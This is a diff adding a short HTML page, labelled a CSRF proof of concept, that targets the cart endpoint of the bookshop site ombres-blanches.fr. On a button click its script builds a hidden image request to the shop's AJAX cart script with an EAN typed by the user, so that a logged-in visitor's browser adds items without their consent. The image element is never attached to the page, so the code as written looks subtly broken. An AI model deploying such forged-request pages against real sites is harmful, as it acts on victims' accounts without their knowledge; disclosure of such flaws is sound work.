@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset='utf8'/>
+    <body>
+        <h1>Ombres blanches CSRF PoC</h1>
+        <p>EAN: <input type='text' id='ean'/></p>
+        <input type='button' id='cart' value='Ajouter au panier'/>
+        <script>
+        var ean = document.getElementById('ean');
+        var cart = document.getElementById('cart');
+        cart.addEventListener('click', function(e) {
+            var img = document.createElement('img');
+            img.src = 'http://www.ombres-blanches.fr/boutique/fonctions_ajax_panier.php?ean=' + ean.value;
+            img.style.display = 'none';
+        });
+        </script>
+    </body>
+</html>
